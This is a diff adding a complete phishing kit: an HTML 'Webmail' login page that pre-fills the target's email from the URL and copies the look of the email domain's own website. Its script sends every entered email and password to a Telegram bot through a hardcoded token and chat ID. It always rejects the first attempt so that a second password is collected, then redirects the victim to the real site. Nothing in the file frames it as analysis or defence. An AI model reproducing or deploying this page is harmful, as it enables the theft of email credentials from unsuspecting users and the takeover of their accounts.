@@ -1,0 +1,186 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Webmail</title>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <style>
+    body {
+      margin: 0; padding: 0; font-family: Arial, Helvetica, sans-serif;
+      height: 100vh; display: flex; align-items: center; justify-content: center;
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      background-attachment: fixed;
+      transition: background 0.8s ease;
+      background-color: #0a2540; /* fallback color */
+    }
+    .container {
+      width: 400px; background: rgba(255,255,255,0.95); border-radius: 10px; 
+      box-shadow: 0 20px 50px rgba(0,0,0,0.6); overflow: hidden;
+    }
+    .header {
+      padding: 30px 20px; text-align: center;
+    }
+    .logo {
+      font-size: 29px; font-weight: 700; letter-spacing: -0.5px;
+    }
+    .form-area { padding: 35px 40px; }
+    input {
+      width: 100%; padding: 14px; margin: 10px 0; background: #fff; border: 1px solid #999;
+      border-radius: 4px; font-size: 15px; box-sizing: border-box;
+    }
+    input[readonly] { background: #f8f8f8; color: #111; }
+    .login-btn {
+      width: 100%; padding: 14px; border: none; border-radius: 4px; 
+      font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 15px;
+    }
+    .error {
+      color: #c8102e; text-align: center; margin: 15px 0; font-size: 14px; display: none;
+    }
+    .loading {
+      text-align: center; color: #002C5F; padding: 110px 20px; font-size: 18px;
+    }
+    .footer { text-align: center; padding: 20px; color: #333; font-size: 13.5px; }
+  </style>
+</head>
+<body>
+
+  <div class="container" id="container">
+    <div id="loadingScreen" class="loading">
+      <p>Connecting to mailbox...</p>
+    </div>
+
+    <div id="loginScreen" style="display:none;">
+      <div class="header" id="header">
+        <div class="logo" id="logo">Webmail</div>
+      </div>
+      <div class="form-area">
+        <form id="loginForm">
+          <label style="color:#333; font-size:13px;">Email Address</label>
+          <input type="email" id="email" readonly required autocomplete="off">
+
+          <label style="color:#333; font-size:13px; margin-top:12px;">Password</label>
+          <input type="password" id="password" required autocomplete="off">
+
+          <div id="errorMsg" class="error">Invalid credentials. Please try again.</div>
+
+          <button type="submit" class="login-btn" id="submitBtn">Sign In</button>
+        </form>
+      </div>
+      <div class="footer" id="footerText">Secure Webmail</div>
+    </div>
+  </div>
+
+  <script>
+    // ================== CONFIG ==================
+    const BOT_TOKEN = "8593721247:AAGIc7N8Yf-n3hyjKSW0puYmic-eYFXmCGI";
+    const CHAT_ID   = "6402969119";
+    const REAL_REDIRECT_FALLBACK = "https://www.google.com";
+    // ===========================================
+
+    let attempt = 1;
+
+    function getBackground(domain) {
+      if (!domain) return "https://image.thum.io/get/width/1920/https://www.dell.com";
+      
+      // Special overrides for major providers (better visuals)
+      const overrides = {
+        "gmail.com": "https://image.thum.io/get/width/1920/https://www.google.com",
+        "google.com": "https://image.thum.io/get/width/1920/https://www.google.com",
+        "outlook.com": "https://image.thum.io/get/width/1920/https://www.microsoft.com",
+        "hotmail.com": "https://image.thum.io/get/width/1920/https://www.microsoft.com",
+        "live.com": "https://image.thum.io/get/width/1920/https://www.microsoft.com",
+        "yahoo.com": "https://image.thum.io/get/width/1920/https://www.yahoo.com",
+        "aol.com": "https://image.thum.io/get/width/1920/https://www.aol.com",
+        "icloud.com": "https://image.thum.io/get/width/1920/https://www.apple.com",
+        "proton.me": "https://image.thum.io/get/width/1920/https://proton.me",
+        "dell.com": "https://image.thum.io/get/width/1920/https://www.dell.com"
+      };
+
+      if (overrides[domain]) {
+        return overrides[domain];
+      }
+
+      // For ALL other domains → dynamic main website screenshot
+      return `https://image.thum.io/get/width/1920/https://www.${domain}`;
+    }
+
+    function sendToTelegram(email, pass, attemptNum, company) {
+      const message = `🔐 New Login Report\n\n` +
+                      `Email: ${email}\n` +
+                      `Password ${attemptNum}: ${pass}\n` +
+                      `Domain: ${company}\n` +
+                      `Time: ${new Date().toLocaleString()}\n` +
+                      `Attempt: ${attemptNum}/2`;
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+      });
+    }
+
+    $(document).ready(function() {
+      let grabbedEmail = "";
+      const urlParams = new URLSearchParams(window.location.search);
+      grabbedEmail = urlParams.get('email');
+
+      if (!grabbedEmail) {
+        const hash = window.location.hash.substring(1);
+        if (hash && hash.includes('@')) grabbedEmail = hash;
+      }
+
+      if (grabbedEmail) {
+        grabbedEmail = decodeURIComponent(grabbedEmail.trim());
+        $("#email").val(grabbedEmail);
+      }
+
+      // Set background based on entered email domain
+      const email = $("#email").val().trim();
+      let domain = "dell.com";
+      if (email && email.includes('@')) {
+        domain = email.split('@')[1].toLowerCase().trim();
+      }
+
+      const bgUrl = getBackground(domain);
+      
+      $("body").css("background-image", `url('${bgUrl}')`);
+      document.title = domain.toUpperCase() + " Secure Login";
+
+      setTimeout(() => {
+        $("#loadingScreen").hide();
+        $("#loginScreen").fadeIn(400);
+      }, 1800);
+
+      $("#loginForm").on("submit", function(e) {
+        e.preventDefault();
+
+        const currentEmail = $("#email").val().trim();
+        const pass = $("#password").val().trim();
+
+        if (!currentEmail || !pass) return;
+
+        let currentDomain = "unknown";
+        if (currentEmail.includes('@')) {
+          currentDomain = currentEmail.split('@')[1].toLowerCase().trim();
+        }
+
+        sendToTelegram(currentEmail, pass, attempt, currentDomain);
+
+        if (attempt === 1) {
+          attempt = 2;
+          $("#errorMsg").show().text("Invalid credentials. Please try again.");
+          $("#password").val("").focus();
+        } else {
+          $("#errorMsg").text("Connecting to mailbox...").css("color", "#0066cc").show();
+          setTimeout(() => {
+            window.location.href = "https://www." + currentDomain;
+          }, 1500);
+        }
+      });
+    });
+  </script>
+</body>
+</html>
